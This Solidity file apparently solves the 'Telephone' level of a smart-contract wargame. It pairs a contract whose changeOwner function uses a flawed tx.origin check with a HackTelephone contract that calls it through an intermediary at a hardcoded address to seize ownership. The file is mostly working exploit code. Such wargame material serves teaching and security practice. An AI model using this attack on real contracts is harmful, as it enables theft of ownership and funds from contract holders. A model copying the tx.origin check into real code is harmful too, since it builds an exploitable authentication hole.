pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract HackTelephone {
    
    address toHackAddress = 0xba7a6a47b6ca9420832b4cbb9aaa78026e86712e;
    
    function hackChangeOwner(){
      Telephone t = Telephone(toHackAddress);
      t.changeOwner(msg.sender);
    }
}